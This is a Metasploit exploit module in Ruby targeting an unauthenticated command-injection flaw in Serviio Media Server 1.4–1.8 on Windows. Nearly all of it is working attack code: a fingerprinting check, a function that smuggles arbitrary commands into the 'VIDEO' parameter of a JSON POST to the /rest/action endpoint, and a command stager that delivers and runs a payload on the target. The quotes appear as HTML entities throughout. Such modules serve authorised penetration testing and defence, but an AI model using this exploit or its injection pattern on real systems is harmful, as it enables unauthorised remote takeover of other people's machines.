# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  HttpFingerprint = { :pattern => [ /Restlet-Framework/ ] }

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Serviio Media Server checkStreamUrl Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an unauthenticated remote command execution vulnerability
        in the console component of Serviio Media Server versions 1.4 to 1.8 on
        Windows operating systems.

        The console service (on port 23423 by default) exposes a REST API which
        which does not require authentication.

        The &#039;action&#039; API endpoint does not sufficiently sanitize user-supplied data
        in the &#039;VIDEO&#039; parameter of the &#039;checkStreamUrl&#039; method. This parameter is
        used in a call to cmd.exe resulting in execution of arbitrary commands.

        This module has been tested successfully on Serviio Media Server versions
        1.4.0, 1.5.0, 1.6.0 and 1.8.0 on Windows 7.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Gjoko Krstic(LiquidWorm) <gjoko[at]zeroscience.mk>&#039;, # Discovery and exploit
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039;, # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;41961&#039;],
          [&#039;PACKETSTORM&#039;, &#039;142387&#039;],
          [&#039;URL&#039;, &#039;http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5408.php&#039;],
          [&#039;URL&#039;, &#039;https://blogs.securiteam.com/index.php/archives/3094&#039;]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;May 3 2017&#039;,
      &#039;DefaultTarget&#039;  => 0))
    register_options([ Opt::RPORT(23423) ])
  end

  def check
    res = execute_command(&#039;&#039;)

    unless res
      vprint_status &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    if res.headers[&#039;Server&#039;] !~ /Serviio/
      vprint_status &#039;Target is not a Serviio Media Server&#039;
      return CheckCode::Safe
    end

    if res.headers[&#039;Server&#039;] !~ /Windows/
      vprint_status &#039;Target operating system is not vulnerable&#039;
      return CheckCode::Safe
    end

    if res.code != 200 || res.body !~ %r{<errorCode>603</errorCode>}
      vprint_status &#039;Unexpected reply&#039;
      return CheckCode::Safe
    end

    if res.headers[&#039;Server&#039;] =~ %r{Serviio/(1\.[4-8])}
      vprint_status "#{peer} Serviio Media Server version #{$1}"
      return CheckCode::Appears
    end

    CheckCode::Safe
  end

  def execute_command(cmd, opts = {})
    data = { &#039;name&#039; => &#039;checkStreamUrl&#039;, &#039;parameter&#039; => [&#039;VIDEO&#039;, "\" &#{cmd}&"] }
    send_request_cgi(&#039;uri&#039;    => normalize_uri(target_uri.path, &#039;rest&#039;, &#039;action&#039;),
                     &#039;method&#039; => &#039;POST&#039;,
                     &#039;ctype&#039;  => &#039;application/json&#039;,
                     &#039;data&#039;   => data.to_json)
  end

  def exploit
    fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable&#039;) unless check == CheckCode::Appears
    execute_cmdstager(:temp => &#039;.&#039;, :linemax => 8000)
  end
end

